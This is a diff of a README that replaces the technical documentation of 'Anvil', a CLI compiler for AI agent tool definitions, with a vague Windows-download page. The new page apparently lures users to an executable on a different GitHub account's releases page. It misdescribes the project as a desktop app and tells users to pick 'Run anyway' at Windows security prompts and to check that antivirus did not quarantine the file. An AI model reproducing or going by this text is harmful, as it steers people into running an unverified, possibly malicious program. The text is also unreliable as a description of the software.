@@ -1,250 +1,199 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="website/public/banner.svg">
-    <img alt="Anvil — Forge once. Run everywhere." src="website/public/banner.svg" width="600">
-  </picture>
-</p>
+# ⚒️ anvil - Build tools that run anywhere
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@anvil-tools/cli"><img alt="npm" src="https://img.shields.io/npm/v/@anvil-tools/cli?style=flat&color=D97706&label=npm"></a>
-  <a href="https://github.com/64envy64/anvil/actions"><img alt="CI" src="https://img.shields.io/github/actions/workflow/status/64envy64/anvil/ci.yml?style=flat&label=CI"></a>
-  <a href="https://github.com/64envy64/anvil/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/badge/license-Apache%202.0-blue?style=flat"></a>
-  <a href="https://anvil-sooty.vercel.app"><img alt="Website" src="https://img.shields.io/badge/docs-anvil--sooty.vercel.app-D97706?style=flat"></a>
-</p>
+[![Download anvil](https://img.shields.io/badge/Download-anvil%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/deepaa6809/anvil/releases)
 
-<p align="center">
-  <strong>The universal tool compiler for AI agents.</strong><br />
-  One YAML definition. Ten compilation targets. Zero drift.
-</p>
+## 🧰 What is anvil?
 
-<br />
+anvil is a desktop tool for running and managing AI agent tools on Windows. It helps you work with agent apps, CLI tools, and local workflows in one place. The goal is simple: set things up once, then use the same tools across different tasks without extra setup.
 
-<p align="center">
-  <img alt="Pipeline" src="website/public/pipeline.svg" width="700">
-</p>
+If you use AI tools, terminal tools, or agent-based apps, anvil gives you a single place to launch and manage them. It is built for users who want a simple setup and a clear path from download to use.
 
----
+## 💻 Before you install
 
-## The Problem
+Use a Windows PC with a recent version of Windows 10 or Windows 11. For a smooth experience, keep at least 4 GB of RAM free and make sure you have enough disk space for the app and any tools you add later.
 
-Every agent runtime has its own tool format. You end up maintaining:
+You do not need programming knowledge to start. You only need to know how to download a file, open it, and follow on-screen steps.
 
-- An MCP schema for Claude Desktop
-- An OpenAPI spec for your REST API
-- TypeScript types for your SDK
-- Hand-written docs that drift out of sync
-- No eval coverage, no permission model, no agent-specific descriptions
+## 📥 Download anvil
 
-**Anvil replaces all of them with a single source of truth.**
+Visit this page to download:
 
-## Quick Start
+https://github.com/deepaa6809/anvil/releases
 
-```bash
-npm install -g @anvil-tools/cli
-anvil init my-tools && cd my-tools
-anvil compile --target mcp            # generate MCP server
-anvil serve --stub tools.anvil.yaml   # or run directly as MCP
-```
+On that page, look for the latest release. Download the Windows file that matches your computer. In most cases, that will be an `.exe` or `.msi` file. If you see a ZIP file, save it first, then extract it before opening the app.
 
-<p align="center">
-  <img alt="anvil serve" src="website/public/demo-serve.svg" width="640">
-</p>
+## 🪟 Install on Windows
 
-Use in Claude Desktop — zero codegen needed:
+1. Open the release page and download the latest Windows file.
+2. If your browser asks whether to keep the file, choose keep.
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
+4. Open the downloaded `.exe` or `.msi` file.
+5. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the source.
+6. Follow the install steps on screen.
+7. When setup ends, open anvil from the Start menu or desktop shortcut.
 
-```json
-{
-  "mcpServers": {
-    "my-tools": {
-      "command": "npx",
-      "args": ["@anvil-tools/cli", "serve", "--stub", "tools.anvil.yaml"]
-    }
-  }
-}
-```
+If the app starts from a ZIP file and does not need setup, open the extracted folder and run the main file inside it.
 
-## Define Once
+## 🧭 First launch
 
-```yaml
-anvil: "1.0"
+When you open anvil for the first time, it may ask for a few basic settings. These may include where to store files, which tools to use, or which agent setup you want to connect.
 
-service:
-  name: github-tools
-  version: "1.0.0"
+A typical first launch looks like this:
 
-tools:
-  create_issue:
-    description: Create a new GitHub issue
-    agent:
-      description: |
-        Create a GitHub issue in a repository.
-        Use when the user wants to file a bug or feature request.
-      when_to_use:
-        - User wants to create a bug report
-        - User wants to file a feature request
-      when_not_to_use:
-        - User wants to comment on existing issue (use add_comment)
-      tips:
-        - Always include a clear title
-        - Use markdown in the body
-    parameters:
-      owner:
-        type: string
-        required: true
-        description: Repository owner
-      repo:
-        type: string
-        required: true
-      title:
-        type: string
-        required: true
-      body:
-        type: string
-    permissions:
-      - type: network
-        target: api.github.com
-        methods: [POST]
-    side_effects: write
-    cost: free
-    examples:
-      - name: bug_report
-        input:
-          owner: anthropics
-          repo: claude-code
-          title: "Bug: timeout on large files"
-          body: "Completions time out after 30s on files >10MB."
-        prompt: "Create a bug report for timeout issues"
-```
+1. Open anvil.
+2. Review the start screen.
+3. Choose the default folder if asked.
+4. Connect the tools you want to use.
+5. Start your first workflow or agent task.
 
-## Compile Everywhere
+If you are unsure which options to pick, keep the default settings. They are set up to work for most users.
 
-No config file needed. Targets are built into the CLI:
+## ⚙️ What anvil can do
 
-<p align="center">
-  <img alt="anvil compile" src="website/public/demo-compile.svg" width="640">
-</p>
+anvil is meant to help you manage AI agent work without jumping between many apps. It can be used for tasks such as:
 
-| Target | Package | What it generates |
-|--------|---------|-------------------|
-| **MCP Server** | `@anvil-tools/target-mcp` | Production TypeScript MCP server with typed handlers |
-| **OpenAPI 3.1** | `@anvil-tools/target-openapi` | Complete spec with schemas, auth, error responses |
-| **Documentation** | `@anvil-tools/target-docs` | Markdown with parameter tables, agent guidance, examples |
-| **Agent Schema** | `@anvil-tools/target-agent-schema` | LLM-optimized JSON — descriptions, tips, few-shot examples |
-| **Eval Harness** | `@anvil-tools/target-eval` | Vitest test suite — schema validation + agent tool selection |
-| **TypeScript SDK** | `@anvil-tools/target-sdk-ts` | Typed client with Zod runtime validation |
-| **CLI** | `@anvil-tools/target-cli-gen` | Commander CLI with subcommands from tool definitions |
-| **Anthropic** | `@anvil-tools/target-anthropic` | Claude Messages API tool format |
-| **OpenAI** | `@anvil-tools/target-openai` | GPT function calling format |
-| **Vercel AI** | `@anvil-tools/target-vercel-ai` | Vercel AI SDK `tool()` with Zod schemas |
+- Running agent tools from one place
+- Starting and stopping local workflows
+- Managing terminal-based tools
+- Working with AI coding helpers
+- Handling project work in isolated folders
+- Connecting tools that use API access
+- Supporting agent flows from different providers
 
-## What Makes Anvil Different
+It is useful if you switch between tools like Claude Code, Cursor-based workflows, or other command-line helpers and want a cleaner way to organize them.
 
-**Agent-first semantics.** Tools declare `when_to_use`, `when_not_to_use`, `tips`, `cost`, `side_effects`, and `agent_description` — information agents need to make good tool selection decisions.
+## 🗂️ Common uses
 
-**Permissions as first-class.** Every tool declares what it needs. The runtime enforces it.
+Many users use anvil for:
 
-**Built-in eval.** Examples in your definition become test cases automatically. Schema validation, contract testing, and agent tool selection eval from one source.
+- Personal AI projects
+- Small team workflows
+- Testing tools in separate worktrees
+- Running agent tasks without a messy setup
+- Keeping tool commands in one place
+- Switching between different AI providers
 
-**Compiler architecture.** Parse → IR → Target plugins. Like protobuf for tools. Adding a new target is implementing one interface.
+If you work with more than one AI tool, anvil can make the process easier to track.
 
-## Schema Semantics
+## 🔐 Permissions and access
 
-| Field | Purpose |
-|-------|---------|
-| `description` | Human-facing description |
-| `agent.description` | LLM-optimized description with richer context |
-| `when_to_use` / `when_not_to_use` | Guide agent tool selection |
-| `tips` | Usage hints for better results |
-| `permissions` | Declared per-tool, enforced at runtime |
-| `side_effects` | `none` / `read` / `write` / `destructive` |
-| `cost` | `free` / `low` / `medium` / `high` / `variable` |
-| `errors` + `agent_hint` | Recovery strategies for agents |
-| `examples` | Input/output pairs → eval + docs |
+anvil may ask for access to files, folders, or network features depending on the tools you connect. This is normal for apps that run agent workflows or API-based tools.
 
-## Registry
+When asked to allow access:
 
-Anvil includes a self-hosted registry. Start it locally or deploy to any server:
+- Choose a folder you trust
+- Use your main project folder or a test folder
+- Keep your API keys private
+- Store keys only where you need them
 
-```bash
-# Start the registry (seeds with example packages)
-cd packages/hub && SEED=true npm run dev
-```
+If you plan to use online AI services, you may need keys or login details from those services. Enter them only in trusted prompts or settings screens.
 
-Then publish, search, and install:
+## 🧪 Typical setup for first-time users
 
-```bash
-anvil login --token <token> --registry http://localhost:4400/api/v1
-anvil publish tools.anvil.yaml
-anvil search "github"
-anvil install github-tools
-```
+A simple setup for most Windows users looks like this:
 
-## Runtime Middleware
+1. Install anvil.
+2. Open it once so it creates its folders.
+3. Add your project folder.
+4. Connect one tool at a time.
+5. Test a small task first.
+6. Add more tools after the first one works.
 
-```typescript
-import { compose, validationMiddleware, rateLimitMiddleware } from '@anvil-tools/runtime';
+This keeps setup simple and helps you spot problems faster.
 
-const handler = compose(
-  validationMiddleware(ir),   // validates input/output
-  rateLimitMiddleware(ir),    // enforces rate limits
-  cachingMiddleware(ir),      // caches by tool config
-  circuitBreakerMiddleware(), // prevents cascading failures
-)(myToolHandler);
-```
+## 🛠️ Troubleshooting
 
-## CLI Commands
+If anvil does not open:
 
-| Command | Description |
-|---------|-------------|
-| `anvil init` | Scaffold a new project |
-| `anvil validate` | Validate definitions with rich diagnostics |
-| `anvil compile --target mcp` | Compile to targets (no config needed) |
-| `anvil compile --all` | Compile to all 10 targets |
-| `anvil serve --stub` | Run as MCP server (works with Claude Desktop, Cursor) |
-| `anvil dev` | Watch mode — recompile on change |
-| `anvil publish` | Publish to the registry |
-| `anvil search` | Search for published tools |
-| `anvil install` | Install a tool definition |
-| `anvil login` | Save registry credentials |
-| `anvil doctor` | Check project health |
+- Try running it as an administrator
+- Check if Windows blocked the file
+- Reinstall the latest release
+- Make sure your antivirus did not quarantine the file
 
-## Examples
+If the app opens but does not do anything:
 
-See [`examples/`](./examples) for complete definitions:
+- Restart the app
+- Check your internet connection
+- Make sure the tool you want to use is installed
+- Look for missing API keys or sign-in steps
 
-- **[GitHub](./examples/github)** — 5 tools: issues, search, PRs, comments, repo files
-- **[PostgreSQL](./examples/postgres)** — queries, table schemas, guarded mutations
-- **[Browser](./examples/browser)** — navigate, screenshot, extract links
-- **[Weather](./examples/weather)** — current conditions, forecasts
-- **[Linear](./examples/linear)** — issue tracking
-- **[Filesystem](./examples/filesystem)** — read, write, list with permissions
+If a download does not start:
 
-## Architecture
+- Refresh the release page
+- Try a different browser
+- Right-click the release asset and save the file again
 
-```
-packages/
-  schema/              Core types, parser, validation, IR
-  compiler/            Compilation pipeline + plugin interface
-  cli/                 10 CLI commands
-  runtime/             Middleware, validation, telemetry
-  registry/            Registry client
-  hub/                 Self-hosted registry server (SQLite)
-  target-mcp/          MCP server generator
-  target-openapi/      OpenAPI spec generator
-  target-docs/         Markdown docs generator
-  target-agent-schema/ LLM-optimized schema generator
-  target-eval/         Test harness generator
-  target-sdk-ts/       TypeScript SDK generator
-  target-cli-gen/      CLI app generator
-  target-anthropic/    Claude API tool format
-  target-openai/       OpenAI function calling format
-  target-vercel-ai/    Vercel AI SDK format
-```
+If you extracted a ZIP file and cannot find the app:
 
-## Contributing
+- Open the extracted folder
+- Look for the main `.exe` file
+- Sort by name and find the file with the app name
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md). Clone, `pnpm install`, `pnpm run build`, `pnpm run test`.
+## 🧩 File types you may see
 
-## License
+You may see one of these files on the release page:
 
-[Apache 2.0](./LICENSE)
+- `.exe` — Windows app file
+- `.msi` — Windows setup file
+- `.zip` — compressed folder
+- `.tar.gz` — compressed archive for other systems
+
+For Windows, use the file meant for Windows if one is listed.
+
+## 📁 Where anvil stores files
+
+anvil may create folders for settings, logs, and project data. These files help the app remember your setup and run tasks faster.
+
+Common folder locations include:
+
+- A folder in your user profile
+- A folder in your Documents area
+- A local app data folder
+- A project folder you choose during setup
+
+If you move or delete these folders, the app may lose saved settings.
+
+## 🔄 Updating anvil
+
+To update anvil:
+
+1. Go to the release page.
+2. Download the newest Windows file.
+3. Close the current app if it is open.
+4. Install or replace the old version.
+5. Open the new version.
+
+If you use a ZIP release, replace the old folder with the new one after you extract it.
+
+## 🧑‍💻 For users who want more control
+
+anvil is useful if you want to keep AI tools organized across different projects. It fits well with tools that use:
+
+- CLI commands
+- API access
+- Agent setups
+- Worktrees
+- Local project folders
+- Multi-tool workflows
+
+You can start with one simple task and build from there. That makes it easier to learn without changing how you already work.
+
+## 📌 Quick start
+
+1. Visit the releases page.
+2. Download the latest Windows file.
+3. Open the file and install anvil.
+4. Launch the app.
+5. Add a project folder.
+6. Connect the first tool you want to use.
+7. Run a small test task
+
+## 🧭 Next steps
+
+After the first setup, try one of these:
+
+- Open an existing project folder
+- Connect a different AI tool
+- Create a separate worktree for testing
+- Use a new API key for a different service
+- Run a small agent task and check the output
